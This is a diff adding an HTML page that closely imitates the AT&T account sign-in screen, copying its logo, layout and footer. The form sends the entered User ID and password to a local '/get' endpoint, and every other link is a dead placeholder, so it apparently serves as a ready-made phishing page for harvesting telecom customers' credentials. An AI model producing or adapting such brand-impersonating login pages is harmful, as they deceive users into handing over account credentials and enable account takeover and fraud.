@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+  <title>Sign in - AT&T</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    .card {
+      background: #fff;
+      border: 1px solid #d3d3d3;
+      border-radius: 8px;
+      padding: 48px 56px;
+      width: 100%;
+      max-width: 460px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 32px;
+    }
+
+    .logo-globe {
+      width: 38px;
+      height: 38px;
+    }
+
+    .logo-text {
+      font-size: 32px;
+      font-weight: 700;
+      color: #000;
+      letter-spacing: -1px;
+    }
+
+    .title {
+      font-size: 36px;
+      font-weight: 300;
+      color: #000;
+      text-align: center;
+      margin-bottom: 4px;
+    }
+
+    .subtitle {
+      font-size: 24px;
+      font-weight: 300;
+      color: #000;
+      text-align: center;
+      margin-bottom: 32px;
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+    }
+
+    .label {
+      display: block;
+      font-size: 14px;
+      color: #000;
+      margin-bottom: 8px;
+    }
+
+    .input {
+      width: 100%;
+      height: 48px;
+      padding: 0 12px;
+      border: 1px solid #000;
+      border-radius: 8px;
+      font-size: 16px;
+      color: #000;
+      background: #fff;
+      outline: none;
+    }
+
+    .input:focus {
+      border-color: #0057b8;
+      box-shadow: 0 0 0 1px #0057b8;
+    }
+
+    .submit-btn {
+      width: 100%;
+      height: 48px;
+      background: rgb(18, 62, 140);
+      color: #fff;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 28px;
+    }
+
+    .submit-btn:hover {
+      background: #333;
+    }
+
+    .link {
+      display: block;
+      color: #0057b8;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      padding: 20px 24px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 24px;
+    }
+
+    .footer a {
+      color: #000;
+      text-decoration: none;
+      font-size: 12px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-privacy {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .footer-privacy svg {
+      width: 24px;
+      height: 14px;
+    }
+
+    @media (max-width: 500px) {
+      .card {
+        padding: 32px 24px;
+      }
+      .title {
+        font-size: 28px;
+      }
+      .subtitle {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+<main class="main">
+  <div class="card">
+    <div class="logo">
+      <svg class="logo-globe" viewBox="0 0 410 340" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#00A8E0" d="M79 326a205 205 0 0 0 262-8s0-1 0 0c-16 10-63 34-135 34a257 257 0 0 1-127-26m140 10c51 0 107-14 140-41 9-7 18-17 25-31a197 197 0 0 0 12-25c-30 45-120 73-213 73-65 0-135-20-163-60 0-1 0-1 0 0 26 54 103 84 199 84m-55-90C59 246 9 197 0 163c0 12 1 26 3 36 1 4 5 12 10 18 26 26 89 63 199 63 150 0 185-49 192-66a151 151 0 0 0 6-62c-7 40-135 94-246 94M20 75c-6 12-13 32-15 43-1 4 0 6 1 10 13 26 77 69 225 69 91 0 162-22 173-63 2-7 2-15 0-26a200 200 0 0 0-14-35c2 53-147 88-222 88-82 0-150-33-150-74l2-12m321-65 2 4c0 23-70 64-182 64-81 0-97-31-97-50 0-7 3-14 9-21 0-1 0-1 0 0-11 9-21 19-29 30-4 5-7 9-7 12 0 40 100 69 194 69 100 0 144-33 144-61 0-10-4-16-14-28L342 9l-1 1m-30-23a203 203 0 0 0-212 1C90-7 84-2 84 4c0 17 41 36 113 36 71 0 126-21 126-40 0-5-4-8-12-13"/>
+      </svg>
+      <span class="logo-text">AT&T</span>
+    </div>
+
+    <h1 class="title">Sign in</h1>
+    <p class="subtitle">to my Account</p>
+
+    <form action="/get" id="email-form-step">
+      <div class="form-group">
+        <label class="label">User ID</label>
+        <input type="text" name="email" class="input" required>
+      </div>
+
+      <div class="form-group">
+        <label class="label">Password</label>
+        <input type="password" name="password" class="input" required>
+      </div>
+
+      <button type="submit" class="submit-btn">Continue</button>
+    </form>
+
+    <a href="#" class="link">Forgot user ID?</a>
+    <a href="#" class="link">Don't have a user ID? Create one now</a>
+    <a href="#" class="link">Pay without signing in</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <a href="#">Legal policy center</a>
+  <a href="#">Privacy policy</a>
+  <a href="#">Terms of use</a>
+  <a href="#">Accessibility</a>
+  <a href="#" class="footer-privacy">
+    <svg viewBox="0 0 30 14" xmlns="http://www.w3.org/2000/svg">
+      <rect x="0" y="0" width="30" height="14" rx="7" fill="#007bff"/>
+      <circle cx="7" cy="7" r="5" fill="#fff"/>
+    </svg>
+    Your privacy choices
+  </a>
+  <a href="#">Screen share code</a>
+</footer>
+</body>
+</html>
